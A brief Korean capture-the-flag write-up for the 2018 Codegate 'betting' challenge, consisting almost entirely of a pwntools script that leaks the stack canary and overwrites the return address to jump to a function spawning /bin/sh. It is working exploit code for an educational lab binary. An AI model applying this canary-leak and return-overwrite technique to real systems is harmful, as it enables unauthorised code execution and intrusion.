---
title: "2018 Codegate betting"
date: 2019-11-13
tags: [Codegate]
categories: [Pwn]
---

x64 Canary Leak 문제다.

```python
from pwn import *
 
context.arch='amd64'
e = ELF('./betting')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
p = process('./betting')
 
helper = e.symbols['helper'] # system("/bin/sh");
 
sla = lambda x,y : p.sendlineafter(x,y)
 
sla('?','A'*24)
sla('?','100')
 
p.recvuntil('Hi, ' + 'A'*24)
canary = u64(p.recv(8)) - 0xA
log.info('canary : ' + hex(canary))
 
sla('?','100')
 
pay = 'h'*40 # [rbp-30h] - [rbp-8] = 40 # rbp-8 = canary
pay += flat(canary,0,helper)
sla(':',pay)
 
p.interactive()
```